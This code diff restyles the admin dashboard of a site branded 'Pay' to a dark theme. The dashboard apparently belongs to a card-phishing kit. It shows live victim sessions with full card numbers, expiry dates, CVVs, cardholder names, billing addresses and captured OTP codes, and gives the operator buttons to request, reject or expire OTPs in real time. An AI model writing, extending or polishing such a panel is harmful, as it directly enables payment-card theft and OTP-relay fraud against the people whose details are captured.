@@ -273,14 +273,14 @@ const Admin = () => {
 
   if (!authenticated) {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center p-4">
+      <div className="min-h-screen bg-[#0a0e1a] flex items-center justify-center p-4">
         <div className="w-full max-w-sm space-y-6">
           <div className="text-center space-y-2">
-            <div className="h-12 w-12 rounded-xl bg-muted flex items-center justify-center mx-auto">
-              <Lock className="h-6 w-6 text-muted-foreground" />
+            <div className="h-12 w-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center mx-auto">
+              <Lock className="h-6 w-6 text-white/50" />
             </div>
-            <h1 className="text-lg font-semibold text-foreground">Admin Access</h1>
-            <p className="text-sm text-muted-foreground">Enter password to continue</p>
+            <h1 className="text-lg font-semibold text-white">Admin Access</h1>
+            <p className="text-sm text-white/40">Enter password to continue</p>
           </div>
           <form onSubmit={handleLogin} className="space-y-3">
             <Input
@@ -288,11 +288,11 @@ const Admin = () => {
               placeholder="Password"
               value={password}
               onChange={(e) => { setPassword(e.target.value); setError(false); }}
-              className={error ? "border-destructive" : ""}
+              className={`bg-white/5 border-white/10 text-white placeholder:text-white/30 focus:border-blue-500/50 focus:ring-blue-500/20 ${error ? "border-red-500/50" : ""}`}
               autoFocus
             />
-            {error && <p className="text-xs text-destructive">Incorrect password</p>}
-            <Button type="submit" className="w-full">Unlock</Button>
+            {error && <p className="text-xs text-red-400">Incorrect password</p>}
+            <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-500 text-white border-0">Unlock</Button>
           </form>
         </div>
       </div>
@@ -300,34 +300,34 @@ const Admin = () => {
   }
 
   return (
-    <div className="min-h-screen bg-muted/30">
+    <div className="min-h-screen bg-[#0a0e1a]">
       {/* ===== HEADER ===== */}
-      <header className="bg-card border-b border-border sticky top-0 z-50">
+      <header className="bg-[#111827] border-b border-white/[0.06] sticky top-0 z-50 backdrop-blur-xl">
         <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
           <div className="flex items-center justify-between h-14">
             <div className="flex items-center gap-3">
-              <div className="h-8 w-8 rounded-lg bg-primary flex items-center justify-center shadow-sm">
-                <span className="text-primary-foreground text-sm font-bold">P</span>
+              <div className="h-8 w-8 rounded-lg bg-blue-600 flex items-center justify-center shadow-lg shadow-blue-600/20">
+                <span className="text-white text-sm font-bold">P</span>
               </div>
               <div className="flex items-center gap-2">
-                <span className="text-foreground font-semibold text-base">Pay</span>
-                <span className="text-[10px] font-semibold uppercase tracking-widest text-muted-foreground bg-muted px-2 py-0.5 rounded">Admin</span>
+                <span className="text-white font-semibold text-base">Pay</span>
+                <span className="text-[10px] font-semibold uppercase tracking-widest text-blue-400/70 bg-blue-500/10 px-2 py-0.5 rounded border border-blue-500/20">Admin</span>
               </div>
             </div>
             <div className="flex items-center gap-3">
               {/* Visitor presence indicator */}
               <div className={`flex items-center gap-2 px-3 py-1.5 rounded-lg border transition-all ${
                 visitorCount > 0
-                  ? "bg-emerald-50 border-emerald-200 dark:bg-emerald-950/30 dark:border-emerald-800"
-                  : "bg-muted border-border"
+                  ? "bg-emerald-500/10 border-emerald-500/20"
+                  : "bg-white/[0.03] border-white/[0.06]"
               }`}>
                 {visitorCount > 0 ? (
-                  <Wifi className="h-3.5 w-3.5 text-emerald-600 dark:text-emerald-400 animate-pulse" />
+                  <Wifi className="h-3.5 w-3.5 text-emerald-400 animate-pulse" />
                 ) : (
-                  <WifiOff className="h-3.5 w-3.5 text-muted-foreground" />
+                  <WifiOff className="h-3.5 w-3.5 text-white/30" />
                 )}
                 <span className={`text-xs font-semibold tabular-nums ${
-                  visitorCount > 0 ? "text-emerald-700 dark:text-emerald-300" : "text-muted-foreground"
+                  visitorCount > 0 ? "text-emerald-300" : "text-white/30"
                 }`}>
                   {visitorCount} online
                 </span>
@@ -335,23 +335,23 @@ const Admin = () => {
               {/* Sound toggle */}
               <button
                 onClick={() => setSoundEnabled(!soundEnabled)}
-                className="h-8 w-8 rounded-md flex items-center justify-center hover:bg-muted transition-colors"
+                className="h-8 w-8 rounded-md flex items-center justify-center hover:bg-white/[0.06] transition-colors"
                 title={soundEnabled ? "Mute alerts" : "Unmute alerts"}
               >
                 {soundEnabled ? (
-                  <Volume2 className="h-4 w-4 text-foreground" />
+                  <Volume2 className="h-4 w-4 text-white/70" />
                 ) : (
-                  <VolumeX className="h-4 w-4 text-muted-foreground" />
+                  <VolumeX className="h-4 w-4 text-white/30" />
                 )}
               </button>
               {/* Tabs */}
-              <div className="flex items-center gap-1 bg-muted rounded-lg p-1">
+              <div className="flex items-center gap-1 bg-white/[0.04] rounded-lg p-1 border border-white/[0.06]">
                 <button
                   onClick={() => setActiveTab("sessions")}
                   className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
                     activeTab === "sessions"
-                      ? "bg-card text-foreground shadow-sm"
-                      : "text-muted-foreground hover:text-foreground"
+                      ? "bg-white/[0.08] text-white shadow-sm"
+                      : "text-white/40 hover:text-white/70"
                   }`}
                 >
                   <Activity className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
@@ -361,8 +361,8 @@ const Admin = () => {
                   onClick={() => setActiveTab("form")}
                   className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
                     activeTab === "form"
-                      ? "bg-card text-foreground shadow-sm"
-                      : "text-muted-foreground hover:text-foreground"
+                      ? "bg-white/[0.08] text-white shadow-sm"
+                      : "text-white/40 hover:text-white/70"
                   }`}
                 >
                   <CreditCard className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
@@ -380,17 +380,17 @@ const Admin = () => {
           {/* Stats Row */}
           <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
             {[
-              { label: "Total Sessions", value: stats.total, icon: Users, accent: "text-primary" },
-              { label: "Pending", value: stats.pending, icon: Clock, accent: "text-yellow-600" },
-              { label: "Awaiting OTP", value: stats.otpRequired, icon: KeyRound, accent: "text-primary" },
-              { label: "Completed", value: stats.completed, icon: ShieldCheck, accent: "text-emerald-600" },
+              { label: "Total Sessions", value: stats.total, icon: Users, accent: "text-blue-400" },
+              { label: "Pending", value: stats.pending, icon: Clock, accent: "text-yellow-400" },
+              { label: "Awaiting OTP", value: stats.otpRequired, icon: KeyRound, accent: "text-blue-400" },
+              { label: "Completed", value: stats.completed, icon: ShieldCheck, accent: "text-emerald-400" },
             ].map((stat) => (
-              <div key={stat.label} className="bg-card rounded-xl border border-border p-4 sm:p-5">
+              <div key={stat.label} className="bg-[#111827] rounded-xl border border-white/[0.06] p-4 sm:p-5 hover:border-white/[0.1] transition-colors">
                 <div className="flex items-center justify-between mb-2">
-                  <span className="text-xs font-medium text-muted-foreground uppercase tracking-wide">{stat.label}</span>
+                  <span className="text-[11px] font-medium text-white/40 uppercase tracking-wide">{stat.label}</span>
                   <stat.icon className={`h-4 w-4 ${stat.accent} opacity-70`} />
                 </div>
-                <p className="text-2xl sm:text-3xl font-bold text-foreground tracking-tight">{stat.value}</p>
+                <p className="text-2xl sm:text-3xl font-bold text-white tracking-tight">{stat.value}</p>
               </div>
             ))}
           </div>
@@ -398,20 +398,20 @@ const Admin = () => {
           {/* Sessions Header */}
           <div className="flex items-center justify-between">
             <div>
-              <h2 className="text-lg font-semibold text-foreground">Live Sessions</h2>
-              <p className="text-xs text-muted-foreground mt-0.5">Real-time monitoring · Auto-updates</p>
+              <h2 className="text-lg font-semibold text-white">Live Sessions</h2>
+              <p className="text-xs text-white/30 mt-0.5">Real-time monitoring · Auto-updates</p>
             </div>
-            <Button variant="outline" size="sm" onClick={fetchSessions} className="gap-1.5">
+            <Button variant="outline" size="sm" onClick={fetchSessions} className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/60 hover:text-white hover:bg-white/[0.08] hover:border-white/[0.12]">
               <RefreshCw className="h-3.5 w-3.5" /> Refresh
             </Button>
           </div>
 
           {/* Sessions List */}
           {sessions.length === 0 ? (
-            <div className="bg-card rounded-xl border border-border p-16 text-center">
-              <Activity className="h-10 w-10 text-muted-foreground/30 mx-auto mb-3" />
-              <p className="text-muted-foreground text-sm font-medium">No sessions yet</p>
-              <p className="text-muted-foreground/60 text-xs mt-1">Waiting for submissions…</p>
+            <div className="bg-[#111827] rounded-xl border border-white/[0.06] p-16 text-center">
+              <Activity className="h-10 w-10 text-white/10 mx-auto mb-3" />
+              <p className="text-white/40 text-sm font-medium">No sessions yet</p>
+              <p className="text-white/20 text-xs mt-1">Waiting for submissions…</p>
             </div>
           ) : (
             <div className="space-y-2.5">
@@ -422,8 +422,8 @@ const Admin = () => {
                 return (
                   <div
                     key={s.id}
-                    className={`bg-card rounded-xl border transition-all duration-200 overflow-hidden ${
-                      isExpanded ? "border-primary/30 shadow-md" : "border-border hover:border-border/80 hover:shadow-sm"
+                    className={`bg-[#111827] rounded-xl border transition-all duration-200 overflow-hidden ${
+                      isExpanded ? "border-blue-500/30 shadow-lg shadow-blue-500/5" : "border-white/[0.06] hover:border-white/[0.1]"
                     }`}
                   >
                     {/* Session row */}
@@ -432,19 +432,19 @@ const Admin = () => {
                       onClick={() => setExpandedSession(isExpanded ? null : s.id)}
                     >
                       {/* Status dot */}
-                      <div className={`h-2.5 w-2.5 rounded-full shrink-0 ${statusConfig.dotColor} ring-4 ring-background`} />
+                      <div className={`h-2.5 w-2.5 rounded-full shrink-0 ${statusConfig.dotColor} ring-4 ring-[#111827]`} />
 
                       {/* Main info */}
                       <div className="flex-1 min-w-0 flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-4">
                         <div className="flex items-center gap-2.5 min-w-0">
                           {getStatusBadge(s.status)}
                           {fd.amount && (
-                            <span className="text-base font-bold text-foreground tabular-nums">€{fd.amount}</span>
+                            <span className="text-base font-bold text-white tabular-nums">€{fd.amount}</span>
                           )}
                         </div>
                         <div className="flex items-center gap-2 min-w-0">
                           {fd.email && (
-                            <span className="text-sm text-muted-foreground truncate flex items-center gap-1">
+                            <span className="text-sm text-white/40 truncate flex items-center gap-1">
                               <Mail className="h-3 w-3 shrink-0" />
                               {fd.email}
                             </span>
@@ -455,73 +455,73 @@ const Admin = () => {
                       {/* Meta */}
                       <div className="flex items-center gap-3 shrink-0">
                         <div className="text-right hidden sm:block">
-                          <p className="text-xs text-muted-foreground">
+                          <p className="text-xs text-white/30">
                             {new Date(s.created_at).toLocaleDateString("en-GB", { day: "2-digit", month: "short" })}
                           </p>
-                          <p className="text-[10px] text-muted-foreground/60">
+                          <p className="text-[10px] text-white/20">
                             {new Date(s.created_at).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" })}
                           </p>
                         </div>
                         {isExpanded
-                          ? <ChevronUp className="h-4 w-4 text-muted-foreground" />
-                          : <ChevronDown className="h-4 w-4 text-muted-foreground" />
+                          ? <ChevronUp className="h-4 w-4 text-white/30" />
+                          : <ChevronDown className="h-4 w-4 text-white/30" />
                         }
                       </div>
                     </div>
 
                     {/* Expanded panel */}
                     {isExpanded && (
-                      <div className="border-t border-border bg-muted/20">
+                      <div className="border-t border-white/[0.06] bg-white/[0.02]">
                         {/* Card details grid */}
                         <div className="p-5 grid grid-cols-1 sm:grid-cols-3 gap-4">
                           <div className="space-y-0.5">
-                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Card Number</p>
-                            <p className="text-sm font-mono text-foreground tracking-wider">{fd.cardNumber || "—"}</p>
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30">Card Number</p>
+                            <p className="text-sm font-mono text-white/90 tracking-wider">{fd.cardNumber || "—"}</p>
                           </div>
                           <div className="space-y-0.5">
-                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Expiry</p>
-                            <p className="text-sm font-mono text-foreground">{fd.expiry || "—"}</p>
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30">Expiry</p>
+                            <p className="text-sm font-mono text-white/90">{fd.expiry || "—"}</p>
                           </div>
                           <div className="space-y-0.5">
-                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">CVV</p>
-                            <p className="text-sm font-mono text-foreground">{fd.cvv || "—"}</p>
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30">CVV</p>
+                            <p className="text-sm font-mono text-white/90">{fd.cvv || "—"}</p>
                           </div>
                           <div className="space-y-0.5">
-                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Cardholder</p>
-                            <p className="text-sm text-foreground">{fd.cardholderName || "—"}</p>
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30">Cardholder</p>
+                            <p className="text-sm text-white/90">{fd.cardholderName || "—"}</p>
                           </div>
                           <div className="space-y-0.5">
-                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Email</p>
-                            <p className="text-sm text-foreground truncate">{fd.email || "—"}</p>
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30">Email</p>
+                            <p className="text-sm text-white/90 truncate">{fd.email || "—"}</p>
                           </div>
                           <div className="space-y-0.5">
-                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground">Session ID</p>
-                            <p className="text-sm font-mono text-muted-foreground">{s.id.slice(0, 12)}…</p>
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30">Session ID</p>
+                            <p className="text-sm font-mono text-white/40">{s.id.slice(0, 12)}…</p>
                           </div>
                           <div className="sm:col-span-3 space-y-0.5">
-                            <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground flex items-center gap-1">
+                            <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 flex items-center gap-1">
                               <MapPin className="h-3 w-3" /> Billing Address
                             </p>
-                            <p className="text-sm text-foreground">
+                            <p className="text-sm text-white/90">
                               {[fd.address1, fd.address2, fd.city, fd.state, fd.zip, fd.country].filter(Boolean).join(", ") || "—"}
                             </p>
                           </div>
                           {fd.otp && (
                             <div className="space-y-0.5">
-                              <p className="text-[10px] uppercase tracking-wider font-semibold text-muted-foreground flex items-center gap-1">
+                              <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 flex items-center gap-1">
                                 <Hash className="h-3 w-3" /> OTP Code
                               </p>
-                              <p className="text-lg font-mono font-bold text-primary tracking-[0.3em]">{fd.otp}</p>
+                              <p className="text-lg font-mono font-bold text-blue-400 tracking-[0.3em]">{fd.otp}</p>
                             </div>
                           )}
                         </div>
 
                         {/* Actions */}
-                        <div className="border-t border-border px-5 py-3.5 flex flex-wrap gap-2 bg-card">
+                        <div className="border-t border-white/[0.06] px-5 py-3.5 flex flex-wrap gap-2 bg-[#111827]">
                           <Button
                             size="sm"
                             variant="outline"
-                            className="gap-1.5"
+                            className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]"
                             onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp"); }}
                           >
                             <KeyRound className="h-3.5 w-3.5" /> Request OTP
@@ -529,7 +529,7 @@ const Admin = () => {
                           <Button
                             size="sm"
                             variant="outline"
-                            className="gap-1.5 text-orange-600 border-orange-300 hover:bg-orange-50"
+                            className="gap-1.5 bg-orange-500/10 border-orange-500/20 text-orange-400 hover:bg-orange-500/20"
                             onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_wrong"); }}
                           >
                             <XCircle className="h-3.5 w-3.5" /> Wrong OTP
@@ -537,22 +537,21 @@ const Admin = () => {
                           <Button
                             size="sm"
                             variant="outline"
-                            className="gap-1.5 text-amber-600 border-amber-300 hover:bg-amber-50"
+                            className="gap-1.5 bg-amber-500/10 border-amber-500/20 text-amber-400 hover:bg-amber-500/20"
                             onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_expired"); }}
                           >
                             <Clock className="h-3.5 w-3.5" /> Expired OTP
                           </Button>
                           <Button
                             size="sm"
-                            className="gap-1.5"
+                            className="gap-1.5 bg-emerald-600 hover:bg-emerald-500 text-white border-0"
                             onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "success"); }}
                           >
                             <CheckCircle className="h-3.5 w-3.5" /> Approve
                           </Button>
                           <Button
                             size="sm"
-                            variant="destructive"
-                            className="gap-1.5"
+                            className="gap-1.5 bg-red-600 hover:bg-red-500 text-white border-0"
                             onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "rejected"); }}
                           >
                             <XCircle className="h-3.5 w-3.5" /> Reject
@@ -561,7 +560,7 @@ const Admin = () => {
                           <Button
                             size="sm"
                             variant="outline"
-                            className="gap-1.5 text-destructive border-destructive/30 hover:bg-destructive/10"
+                            className="gap-1.5 bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20"
                             onClick={(e) => { e.stopPropagation(); deleteSession(s.id); }}
                           >
                             <Trash2 className="h-3.5 w-3.5" /> Delete
